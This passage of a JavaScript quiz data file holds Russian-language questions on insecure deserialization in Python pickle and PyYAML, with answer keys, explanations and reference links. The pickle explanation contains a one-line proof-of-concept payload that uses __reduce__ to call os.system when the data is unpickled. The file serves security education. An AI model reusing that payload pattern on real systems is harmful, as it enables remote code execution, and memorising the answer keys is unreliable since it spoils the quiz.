            "Ошибка в Pandas",
            "Уязвимость в Django",
            "Безопасный формат данных",
            "Тип базы данных",
            "Сжатие данных"
        ],
        correctAnswerIndex: 0,
        explanation: "Никогда не используйте `pickle.load()` на недоверенных данных. `class A: def __reduce__(self): return (os.system, ('ls',))`.",
        link: {
            label: "Exploiting Python Pickle",
            url: "https://davidhamann.de/2020/04/05/exploiting-python-pickle/"
        }
    },
    {
        question: "В чем опасность YAML десериализации (PyYAML, Ruby, Java)?",
        answers: [
            "Некоторые парсеры (например, PyYAML `load()`) по умолчанию позволяют создавать произвольные объекты и выполнять код",
            "YAML не поддерживает комментарии",
            "YAML сложный формат",
            "YAML только для конфигов",
            "Нет опасности",
            "Опасен только JSON",
            "Только в Kubernetes"
        ],
        correctAnswerIndex: 0,
        explanation: "Всегда используйте `safe_load()`. Обычный `load()` в старых версиях — это RCE hole.",
        link: {
            label: "YAML Deserialization Attack",
            url: "https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation"
        }
    }
];
